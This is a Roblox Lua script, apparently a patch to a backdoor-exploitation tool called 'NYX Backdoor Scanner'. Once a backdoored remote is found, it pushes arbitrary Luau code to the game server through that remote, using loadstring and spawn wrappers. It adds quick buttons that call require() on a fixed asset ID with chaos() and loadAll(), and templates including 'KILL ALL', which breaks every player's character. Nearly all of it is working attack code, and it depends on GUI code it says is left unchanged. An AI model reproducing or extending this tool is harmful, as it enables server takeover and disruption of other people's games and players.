-- ============================================================================
-- NYX BACKDOOR SCANNER ULTIMATE
-- VERSION: 2.0 - LUA/LUAU SUPPORT
-- ============================================================================

-- [ВЕСЬ КОД GUI ОСТАЁТСЯ БЕЗ ИЗМЕНЕНИЙ ДО ФУНКЦИИ runRemote]

-- ============================================================================
-- ENHANCED: ПОДДЕРЖКА LUA/LUAU (ТРИ РЕЖИМА ВЫПОЛНЕНИЯ)
-- ============================================================================

local ExecutionMode = {
    REQUIRE = 1,   -- require(ID).method()
    RAW_LUA = 2,   -- прямой Lua-код
    LOADSTRING = 3 -- loadstring()
}

-- Улучшенная функция runRemote с автоопределением режима
local function runRemoteEnhanced(remote, data)
    local success, err = pcall(function()
        -- Режим 1: Если data - число, пробуем require
        if type(data) == "number" then
            remote:FireServer("require(" .. data .. ").chaos()")
            remote:FireServer("require(" .. data .. ").loadAll()")
            return
        end
        
        -- Режим 2: Если data начинается с "require("
        if type(data) == "string" and data:match("^require%(") then
            remote:FireServer(data)
            return
        end
        
        -- Режим 3: Прямой Lua-код
        if type(data) == "string" then
            -- Пробуем разные форматы обёртки
            local wrappers = {
                data,                                    -- чистый код
                "loadstring('" .. data:gsub("'", "\\'") .. "')()",  -- loadstring
                "local f=loadstring('" .. data:gsub("'", "\\'") .. "')f()",
                'spawn(function() ' .. data .. ' end)'
            }
            
            for _, wrapped in ipairs(wrappers) do
                pcall(function() remote:FireServer(wrapped) end)
                pcall(function() remote:InvokeServer(wrapped) end)
            end
            return
        end
    end)
    
    if not success and RunService:IsStudio() then
        warn("[NYX] Remote execution failed: " .. tostring(err))
    end
end

-- Оригинальная runRemote (для совместимости)
local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function() 
            pcall(function() remote:InvokeServer(data) end)
        end)
    end
end

-- ============================================================================
-- НОВАЯ ФУНКЦИЯ: ВЫПОЛНЕНИЕ LUA/LUAU ЧЕРЕЗ БЭКДОР
-- ============================================================================
local function executeLua(remote, code, mode)
    mode = mode or ExecutionMode.RAW_LUA
    
    if mode == ExecutionMode.REQUIRE then
        -- Режим require(ID)
        local id = tonumber(code)
        if id then
            runRemoteEnhanced(remote, id)
            return true, "Require(" .. id .. ") sent"
        else
            return false, "Invalid ID for REQUIRE mode"
        end
        
    elseif mode == ExecutionMode.RAW_LUA then
        -- Режим сырого Lua
        runRemoteEnhanced(remote, code)
        return true, "Lua code sent"
        
    elseif mode == ExecutionMode.LOADSTRING then
        -- Режим loadstring
        local wrapped = "loadstring('" .. code:gsub("'", "\\'") .. "')()"
        runRemoteEnhanced(remote, wrapped)
        return true, "Loadstring sent"
    end
end

-- ============================================================================
-- ОБНОВЛЁННЫЙ EXECUTOR FRAME (ДОБАВЛЕН ВЫБОР РЕЖИМА)
-- ============================================================================

-- Добавляем выпадающий список режимов
G2L["execModeDropdown"] = Instance.new("TextButton", G2L["executorFrame"])
G2L["execModeDropdown"]["Size"] = UDim2.new(0, 150, 0, 25)
G2L["execModeDropdown"]["Position"] = UDim2.new(0, 0, 0, 130)
G2L["execModeDropdown"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30)
G2L["execModeDropdown"]["Text"] = "MODE: RAW LUA"
G2L["execModeDropdown"]["TextColor3"] = Color3.fromRGB(0, 255, 0)
G2L["execModeDropdown"]["Font"] = Enum.Font.Code
G2L["execModeDropdown"]["TextSize"] = 11

local currentMode = ExecutionMode.RAW_LUA
local modeNames = {
    [ExecutionMode.REQUIRE] = "MODE: REQUIRE(ID)",
    [ExecutionMode.RAW_LUA] = "MODE: RAW LUA",
    [ExecutionMode.LOADSTRING] = "MODE: LOADSTRING"
}

G2L["execModeDropdown"].MouseButton1Click:Connect(function()
    currentMode = currentMode + 1
    if currentMode > ExecutionMode.LOADSTRING then
        currentMode = ExecutionMode.REQUIRE
    end
    G2L["execModeDropdown"].Text = modeNames[currentMode]
end)

-- Сдвигаем scriptBox немного вниз
G2L["scriptBox"].Position = UDim2.new(0, 0, 0, 160)
G2L["scriptBox"].Size = UDim2.new(1, 0, 0, 120)

-- Обновляем кнопку Execute
local oldExecConnect = G2L["execBtn"].MouseButton1Click
G2L["execBtn"]:ClearAllChildren()
G2L["execBtn"].MouseButton1Click:Connect(function()
    local code = G2L["scriptBox"].Text
    if code == "" then
        G2L["execStatus"].Text = "No script!"
        return
    end
    
    if not backdoor then
        G2L["execStatus"].Text = "No backdoor! Scan first."
        return
    end
    
    code = string.gsub(code, "%%username%%", player.Name)
    
    local success, msg = executeLua(backdoor, code, currentMode)
    if success then
        G2L["execStatus"].Text = "Executed! " .. msg
        addLog("Script executed (" .. modeNames[currentMode] .. ")")
    else
        G2L["execStatus"].Text = "Error: " .. msg
    end
end)

-- ============================================================================
-- БЫСТРЫЕ КНОПКИ ДЛЯ ВАШИХ МОДУЛЕЙ
-- ============================================================================

local quickButtons = {
    {text = "CHAOS", id = 85345420952288, method = "chaos()"},
    {text = "ANNOUNCE", id = 85345420952288, method = "loadAll()"},
    {text = "CLEANUP", id = 85345420952288, method = "cleanup()"}
}

for i, btn in ipairs(quickButtons) do
    local qBtn = Instance.new("TextButton", G2L["executorFrame"])
    qBtn.Size = UDim2.new(0, 70, 0, 20)
    qBtn.Position = UDim2.new(0, (i-1)*75, 0, 200)
    qBtn.BackgroundColor3 = Color3.fromRGB(0, 80, 80)
    qBtn.Text = btn.text
    qBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    qBtn.Font = Enum.Font.Code
    qBtn.TextSize = 10
    
    qBtn.MouseButton1Click:Connect(function()
        if backdoor then
            local cmd = "require(" .. btn.id .. ")." .. btn.method
            runRemoteEnhanced(backdoor, cmd)
            G2L["execStatus"].Text = "Sent: " .. cmd
            addLog("Quick action: " .. btn.text)
        else
            G2L["execStatus"].Text = "No backdoor! Scan first."
        end
    end)
end

-- ============================================================================
-- ШАБЛОНЫ LUA-КОДА
-- ============================================================================

local templates = {
    ["PRINT ALL"] = [[for _,v in ipairs(game:GetService("Players"):GetPlayers()) do print(v.Name) end]],
    ["KILL ALL"] = [[for _,v in ipairs(game:GetService("Players"):GetPlayers()) do 
        if v.Character then v.Character:BreakJoints() end 
    end]],
    ["SERVER INFO"] = [[print("PlaceId:", game.PlaceId, "JobId:", game.JobId)]],
    ["REQUIRE CHAOS"] = "require(85345420952288).chaos()",
    ["REQUIRE ALL"] = "require(85345420952288).loadAll()"
}

local templateDropdown = Instance.new("TextButton", G2L["executorFrame"])
templateDropdown.Size = UDim2.new(0, 150, 0, 25)
templateDropdown.Position = UDim2.new(0, 160, 0, 130)
templateDropdown.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
templateDropdown.Text = "TEMPLATES ▼"
templateDropdown.TextColor3 = Color3.fromRGB(255, 150, 0)
templateDropdown.Font = Enum.Font.Code
templateDropdown.TextSize = 11

local templateList = Instance.new("Frame", G2L["executorFrame"])
templateList.Size = UDim2.new(0, 150, 0, 150)
templateList.Position = UDim2.new(0, 160, 0, 155)
templateList.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
templateList.BorderSizePixel = 1
templateList.Visible = false

templateDropdown.MouseButton1Click:Connect(function()
    templateList.Visible = not templateList.Visible
end)

local yPos = 0
for name, code in pairs(templates) do
    local btn = Instance.new("TextButton", templateList)
    btn.Size = UDim2.new(1, 0, 0, 20)
    btn.Position = UDim2.new(0, 0, 0, yPos)
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.Code
    btn.TextSize = 10
    
    btn.MouseButton1Click:Connect(function()
        G2L["scriptBox"].Text = code
        templateList.Visible = false
    end)
    
    yPos = yPos + 20
end

print("[NYX SCANNER] Enhanced version loaded!")
print("[NYX SCANNER] Lua/Luau support: ENABLED")
print("[NYX SCANNER] Execution modes: REQUIRE, RAW LUA, LOADSTRING")
